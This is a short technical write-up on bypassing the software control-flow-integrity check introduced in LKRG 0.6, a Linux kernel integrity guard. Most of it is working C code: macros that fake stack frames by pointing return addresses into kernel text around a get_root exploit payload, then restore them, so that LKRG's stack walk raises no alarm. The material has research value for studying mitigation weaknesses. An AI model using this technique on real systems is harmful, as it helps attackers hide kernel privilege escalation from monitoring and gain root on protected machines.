CFI bypass
==========

Software-based CFI mitigation (pCFI) was intoduced in LKRG 0.6 (https://www.openwall.com/lists/lkrg-users/2019/02/19/1).

The idea behind this mitigation is that LKRG walks through the call stack checking if the stack-frame has the address which belongs to the kernel. Once it detects the address which points outside the kernel's text it will trigger an alarm.

Bypassing LKRG's pCFI mitigation is trivial and can be done by wrapping the `get_root()` function as follows:

~~~
struct stack_frame {
	struct stack_frame *next_frame;
	unsigned long return_address;
};

#define cfi_bypass_enter(frames, depth) \
do { \
	struct stack_frame *frame = __builtin_frame_address(0); \
	for (int i = 1; i < (depth); i++) { \
		frames[i] = *frame; \
		frame->return_address = X_printk; \
		frame = frame->next_frame; \
	} \
} while (0)

#define cfi_bypass_leave(frames, depth) \
do { \
	struct stack_frame *frame = __builtin_frame_address(0); \
	for (int i = 1; i < (depth); i++) { \
		*frame = frames[i]; \
	frame = frame->next_frame; \
	} \
} while (0)

void get_root()
{
	struct stack_frame frames[ 8 ];
	cfi_bypass_enter(frames, sizeof(frames) / sizeof(frames[0]));
	get_root_real();
	cfi_bypass_leave(frames, sizeof(frames) / sizeof(frames[0]));
}
~~~

Here, `cfi_bypass_enter` is a macro which fakes `N` frames by:
 - saving them locally to `frames` array
 - replacing `return_address` of each frame so it will point to some address in kernel's text

Once the call to `get_root_real()` is done `cfi_bypass_leave` macro does the opposite: it restores all the saved frames from the `frames` array.
